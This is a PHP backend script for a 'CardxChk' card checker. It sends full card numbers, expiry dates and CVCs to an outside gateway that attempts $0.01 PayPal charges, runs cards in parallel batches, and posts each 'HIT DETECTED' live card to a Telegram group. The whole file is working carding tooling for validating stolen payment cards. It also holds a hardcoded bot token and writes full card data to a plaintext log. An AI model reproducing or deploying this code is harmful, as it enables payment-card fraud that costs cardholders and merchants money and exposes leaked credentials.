<?php
header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response) {
    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Skip 3DS responses
    if (is3DAuthenticationResponse($response)) {
        log_message("Skipping Telegram notification for 3DS response: $response");
        return;
    }

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true  // Added to prevent link previews
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}


// Function to check a single card via PayPal 0.1$ API
function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
    log_message("Checking card: $card_details, URL: $api_url");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        $curl_errno = curl_errno($ch);
        curl_close($ch);

        log_message("Attempt " . ($attempt + 1) . " for $card_details: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 200));

        // Handle API errors
        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                log_message("Timeout for $card_details, retrying...");
                usleep(500000);
                continue;
            }
            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
            return "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)]";
        }

        // Parse JSON response
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
            log_message("Invalid JSON for $card_details: " . substr($response, 0, 200));
            return "DECLINED [Invalid API response: " . substr($response, 0, 200) . "]";
        }

        $status = $result['status'];
        $message = $result['response'] ?? 'Unknown error';

        // Map API response to status
        $final_status = 'DECLINED';
        $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');

        if ($status === 'charged') {
            $final_status = 'CHARGED';
        } elseif ($status === 'approved' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
            $final_status = 'APPROVED';
        } elseif ($message === 'CARD ADDED') {
            $final_status = 'CHARGED';
            $response_msg = 'Your $0.01 payment was successful.';
        } elseif ($status === 'declined') {
            $final_status = 'DECLINED';
        }

        $result_string = "$final_status [$response_msg]";
        log_message("$final_status for $card_details: $response_msg");

        // Send Telegram notification for CHARGED or APPROVED
        if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
            sendTelegramNotification($card_details, $final_status, $result_string);
        }

        return $result_string;
    }

    log_message("Failed after retries for $card_details");
    return "DECLINED [API request failed after retries]";
}

// Function to check multiple cards in parallel
function checkCardsParallel($cards, $max_concurrent = 3) {
    if (empty($cards) || !is_array($cards)) {
        return "DECLINED [No cards provided for parallel check]";
    }

    $mh = curl_multi_init();
    $chs = [];
    $results = [];
    $processed = 0;

    foreach ($cards as $index => $card) {
        if ($processed >= $max_concurrent) {
            break;
        }

        $card_number = preg_replace('/[^0-9]/', '', $card['number'] ?? '');
        $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month'] ?? '');
        $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year'] ?? '');
        $cvc = preg_replace('/[^0-9]/', '', $card['cvc'] ?? '');

        $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
        if (strlen($exp_year_raw) == 2) {
            $current_year = (int) date('y');
            $current_century = (int) (date('Y') - $current_year);
            $card_year = (int) $exp_year_raw;
            $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
        } elseif (strlen($exp_year_raw) == 4) {
            $exp_year = (int) $exp_year_raw;
        } else {
            $exp_year = (int) date('Y') + 1;
        }

        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
        $encoded_cc = urlencode($card_details);
        $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');

        $chs[$index] = $ch;
        curl_multi_add_handle($mh, $ch);
        log_message("Added parallel check for card $index: $card_details");

        $processed++;
    }

    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    foreach ($chs as $index => $ch) {
        $response = curl_multi_getcontent($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);

        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            $results[$index] = "DECLINED [Parallel API request failed: $curl_error (HTTP $http_code)]";
            log_message("Parallel check failed for card $index: $curl_error (HTTP $http_code)");
            continue;
        }

        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
            $results[$index] = "DECLINED [Invalid parallel API response: " . substr($response, 0, 200) . "]";
            log_message("Invalid JSON in parallel check for card $index: " . substr($response, 0, 200));
            continue;
        }

        $status = $result['status'];
        $message = $result['response'] ?? 'Unknown error';

        $final_status = 'DECLINED';
        if ($status === 'charged') {
            $final_status = 'CHARGED';
        } elseif ($status === 'approved' || $message === 'EXISTING_ACCOUNT_RESTRICTED') {
            $final_status = 'APPROVED';
        } elseif ($message === 'CARD ADDED') {
            $final_status = 'CHARGED';
            $message = 'Your $0.01 payment was successful.';
        } elseif ($status === 'declined') {
            $final_status = 'DECLINED';
        }

        $results[$index] = "$final_status [$message]";
        log_message("Parallel result for card $index: $final_status [$message]");

        // Send Telegram notification for CHARGED or APPROVED
        if ($final_status === 'CHARGED' || $final_status === 'APPROVED') {
            sendTelegramNotification($cards[$index]['number'] . '|' . $exp_month . '|' . $exp_year . '|' . $cvc, $final_status, $results[$index]);
        }
    }

    curl_multi_close($mh);
    return implode("\n", $results);
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid request or missing card data']);
    exit;
}

// Handle single card or multiple cards
if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
    $card = $_POST['card'];
    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field");
            echo json_encode(['status' => 'DECLINED', 'message' => "Missing $field"]);
            exit;
        }
    }

    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format: $exp_month_raw");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_month format']);
        exit;
    }

    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format: $exp_year_raw");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_year format - must be YY or YYYY']);
        exit;
    }

    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format: $card_number");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card number format']);
        exit;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization: $exp_year");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid exp_year format or too far in future']);
        exit;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format: $cvc");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid CVC format']);
        exit;
    }

    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
        echo json_encode(['status' => 'DECLINED', 'message' => 'Card expired']);
        exit;
    }

    $result = checkCard($card_number, $exp_month, $exp_year, $cvc);
    echo json_encode(['status' => explode(' [', $result)[0], 'message' => $result]);
} elseif (is_array($_POST['card']) && count($_POST['card']) > 1) {
    $results = checkCardsParallel($_POST['card'], 3);
    echo json_encode(['status' => 'MULTI', 'message' => $results]);
} else {
    log_message("Invalid card data format");
    echo json_encode(['status' => 'DECLINED', 'message' => 'Invalid card data format']);
}
?>
